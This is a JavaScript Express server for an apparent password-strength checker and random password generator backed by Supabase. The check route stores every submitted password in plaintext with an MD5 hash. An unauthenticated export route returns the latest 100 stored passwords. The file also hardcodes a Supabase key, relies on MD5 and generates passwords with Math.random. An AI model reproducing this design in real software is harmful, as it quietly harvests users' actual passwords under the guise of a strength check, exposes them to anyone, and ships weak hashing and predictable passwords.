const express = require('express');
const cors = require('cors');
const { createClient } = require('@supabase/supabase-js');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5001; // Changed from 5000 to 5001

// Middleware
app.use(cors({
  origin: 'http://localhost:3000', // Allow frontend origin
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json());

// Supabase client
const supabaseUrl = 'https://ykvevrovdvstxmhoxynr.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlrdmV2cm92ZHZzdHhtaG94eW5yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDc1MDYzMzcsImV4cCI6MjA2MzA4MjMzN30.N_dfboIPEaTdNSt1bTVEntqj8HVXOer9VvWA9Y0Wyls';
const supabase = createClient(supabaseUrl, supabaseKey);

// Hash password with MD5
function md5Hash(password) {
  return crypto.createHash('md5').update(password).digest('hex');
}

// Routes
app.post('/api/check-password', async (req, res) => {
  try {
    const { password } = req.body;
    const hash = md5Hash(password);
    
    // Store the attempt in Supabase
    await supabase.from('password_attempts').insert({
      password: password,
      hash: hash,
      timestamp: new Date()
    });
    
    // Check against common passwords (simplified version)
    // In a real app, you'd use a more efficient method than loading the entire file
    const fs = require('fs');
    const commonPasswords = fs.readFileSync('./rockyou-sample.txt', 'utf-8')
      .split('\n')
      .map(line => line.trim())
      .filter(line => line.length > 0);
    
    const isCommon = commonPasswords.includes(password);
    
    res.json({
      hash,
      isCommon,
      strength: calculatePasswordStrength(password),
      score: calculatePasswordScore(password)
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Calculate password strength
function calculatePasswordStrength(password) {
  let score = calculatePasswordScore(password);
  
  // Map score to strength
  if (score <= 2) return 'weak';
  if (score <= 4) return 'medium';
  return 'strong';
}

// Calculate password score (separate function for reuse)
function calculatePasswordScore(password) {
  let score = 0;
  
  // Length check
  if (password.length >= 8) score += 1;
  if (password.length >= 12) score += 1;
  
  // Character variety
  if (/[A-Z]/.test(password)) score += 1;
  if (/[a-z]/.test(password)) score += 1;
  if (/[0-9]/.test(password)) score += 1;
  if (/[^A-Za-z0-9]/.test(password)) score += 1;
  
  return score;
}

// Generate password based on pattern
app.post('/api/generate-password', (req, res) => {
  try {
    const { pattern, length } = req.body;
    const generatedPassword = generatePasswordFromPattern(pattern, length);
    
    res.json({
      password: generatedPassword,
      hash: md5Hash(generatedPassword),
      strength: calculatePasswordStrength(generatedPassword),
      score: calculatePasswordScore(generatedPassword)
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Export password data
app.get('/api/export-passwords', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('password_attempts')
      .select('*')
      .order('timestamp', { ascending: false })
      .limit(100);
    
    if (error) throw error;
    
    res.json(data);
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Generate password from pattern
function generatePasswordFromPattern(pattern, length = 12) {
  const patterns = {
    lowercase: 'abcdefghijklmnopqrstuvwxyz',
    uppercase: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
    numbers: '0123456789',
    symbols: '!@#$%^&*()_+-=[]{}|;:,.<>?'
  };
  
  let chars = '';
  
  // Add character sets based on pattern
  if (pattern.includes('a')) chars += patterns.lowercase;
  if (pattern.includes('A')) chars += patterns.uppercase;
  if (pattern.includes('0')) chars += patterns.numbers;
  if (pattern.includes('#')) chars += patterns.symbols;
  
  // Default to all character types if no valid pattern provided
  if (!chars) {
    chars = patterns.lowercase + patterns.uppercase + patterns.numbers + patterns.symbols;
  }
  
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * chars.length);
    password += chars[randomIndex];
  }
  
  return password;
}

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
